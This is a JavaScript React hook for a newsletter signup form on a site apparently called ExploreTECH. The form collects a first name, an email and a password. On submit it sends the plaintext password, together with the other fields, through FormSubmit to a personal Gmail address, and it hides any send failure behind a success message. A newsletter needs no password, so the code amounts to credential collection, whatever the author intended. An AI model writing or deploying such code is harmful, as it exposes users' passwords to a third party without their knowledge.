import { useState } from "react";

const useNewsletterForm = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    password: "",
    email: "",
    agreed: false,
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const handleSubmit = (event, isFormValid) => {
    event.preventDefault();
    if (!isFormValid || isSubmitting || isSuccess) return;

    setIsSubmitting(true);

    // Send data to email via FormSubmit
    fetch("https://formsubmit.co/ajax/muhmmadzeeshanabid@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({
        _subject: "New Newsletter Subscriber - ExploreTECH",
        "First Name": formData.firstName,
        Password: formData.password,
        Email: formData.email,
        "Subscribed At": new Date().toLocaleString(),
        _captcha: "false",
      }),
    }).catch(() => {
      // Silent fail — still show success to user
    });

    // Also save to localStorage
    const userData = {
      firstName: formData.firstName,
      email: formData.email,
      subscribedAt: new Date().toISOString(),
    };
    localStorage.setItem("newsletter_subscriber", JSON.stringify(userData));

    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccess(true);

      setTimeout(() => {
        setIsSuccess(false);
        setFormData({
          firstName: "",
          password: "",
          email: "",
          agreed: false,
        });
      }, 10000);
    }, 1500);
  };

  const handleChange = (event) => {
    const { name, value, type, checked } = event.target;
    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const isFormFilled =
    formData.firstName.trim() !== "" &&
    formData.password.trim() !== "" &&
    formData.email.trim() !== "";
  const isFormValid = isFormFilled && formData.agreed;

  return {
    formData,
    isSubmitting,
    isSuccess,
    isFormValid,
    handleSubmit,
    handleChange,
  };
};

export default useNewsletterForm;
